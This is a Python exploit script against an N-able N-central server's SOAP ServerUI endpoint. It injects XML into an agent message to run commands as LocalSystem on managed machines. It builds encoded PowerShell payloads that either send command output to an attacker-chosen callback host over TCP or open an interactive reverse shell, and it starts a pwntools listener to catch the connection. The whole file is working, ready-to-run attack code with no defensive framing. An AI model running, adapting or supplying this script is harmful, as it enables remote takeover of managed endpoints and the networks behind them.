#!/usr/bin/env python3
import argparse
import base64
import html
import json
import uuid

import requests
import urllib3
from pwn import context as pwn_context
from pwn import listen


def context(command, feature):
    body = json.dumps(
        {
            "globalParameters": [
                {"paramName": "AccountName", "paramValue": "LocalSystem"},
                {"paramName": "AccountDetail", "paramValue": ""},
            ],
            "targets": [{"targetId": command, "parameters": []}],
        },
        separators=(",", ":"),
    )
    values = [
        ("messageUUID", str(uuid.uuid4())),
        ("action", "Start"),
        ("body", body),
        ("feature", feature),
    ]
    params = "".join(
        f'<parameter><name>{html.escape(name)}</name><value type="string">{html.escape(value)}</value></parameter>'
        for name, value in values
    )
    injected = (
        '<messagecontext><messageid>20</messageid><name>AgentActionMessage</name>'
        f'<parameters><count>4</count>{params}</parameters></messagecontext>'
    )
    return (
        "</value></parameter></parameters></messagecontext>"
        + injected
        + '<messagecontext><messageid>999</messageid><name>Tail</name><parameters><count>1</count><parameter><name>body</name><value type="string">'
    )


def envelope(appliance_id, body, timeout):
    return f'''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:m="http://www.n-able.com/mickey" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<soapenv:Body><m:GenericAgentXMPPMessageExchange soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SessionID xsi:type="xsd:int">-1</SessionID><ApplianceID xsi:type="xsd:int">{appliance_id}</ApplianceID>
<Subject xsi:type="xsd:string">PierDetailsExchange</Subject><Body xsi:type="xsd:string">{html.escape(body)}</Body>
<ResponseTimeout xsi:type="xsd:int">{timeout}</ResponseTimeout>
</m:GenericAgentXMPPMessageExchange></soapenv:Body></soapenv:Envelope>'''


def powershell(script):
    encoded = base64.b64encode(script.encode("utf-16le")).decode()
    return f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {encoded}"


def callback_command(host, port, command):
    command64 = base64.b64encode(command.encode()).decode()
    return powershell(
        f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{command64}'));"
        f"$o=cmd.exe /c $c 2>&1|Out-String;$t=[Net.Sockets.TcpClient]::new('{host}',{port});"
        "$s=$t.GetStream();$b=[Text.Encoding]::UTF8.GetBytes($o);"
        "$s.Write($b,0,$b.Length);$s.Dispose();$t.Dispose()"
    )


def reverse_shell(host, port):
    return powershell(
        f"$t=[Net.Sockets.TcpClient]::new('{host}',{port});$s=$t.GetStream();"
        "$b=New-Object byte[] 65536;while(($n=$s.Read($b,0,$b.Length))-gt 0){"
        "$c=[Text.Encoding]::UTF8.GetString($b,0,$n);$o=(Invoke-Expression $c 2>&1|Out-String);"
        "$o+='PS '+(Get-Location).Path+'> ';$d=[Text.Encoding]::UTF8.GetBytes($o);"
        "$s.Write($d,0,$d.Length);$s.Flush()};$s.Dispose();$t.Dispose()"
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--origin", default="https://n-central.local")
    parser.add_argument("--appliance-id", required=True, type=int)
    parser.add_argument("--command", default="whoami")
    parser.add_argument("--callback-host")
    parser.add_argument("--callback-port", default=18491, type=int)
    parser.add_argument("--lhost")
    parser.add_argument("--lport", default=4444, type=int)
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--send-only", action="store_true")
    parser.add_argument("--feature", default="ProcessController")
    parser.add_argument("--timeout", default=10000, type=int)
    args = parser.parse_args()

    reverse = bool(args.lhost)
    if not args.send_only and not reverse and not args.callback_host:
        parser.error("--callback-host is required unless --lhost is used")
    if args.send_only:
        command = args.command
        receiver = None
    else:
        host = args.lhost if reverse else args.callback_host
        port = args.lport if reverse else args.callback_port
        command = reverse_shell(host, port) if reverse else callback_command(host, port, args.command)
        pwn_context.log_level = "error"
        receiver = listen(port, bindaddr=args.listen_host, timeout=360)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.origin.rstrip("/") + "/dms/services/ServerUI",
        data=envelope(args.appliance_id, context(command, args.feature), args.timeout),
        headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
        verify=False,
        timeout=max(20, args.timeout / 1000 + 10),
    )
    print(f"http={response.status_code}")
    if args.send_only:
        return
    connection = receiver.wait_for_connection()
    if connection is None or receiver.sock is None:
        raise RuntimeError("callback was not received")
    if reverse:
        receiver.interactive()
    else:
        print(receiver.recvall(timeout=10).decode(errors="replace").strip())


if __name__ == "__main__":
    main()
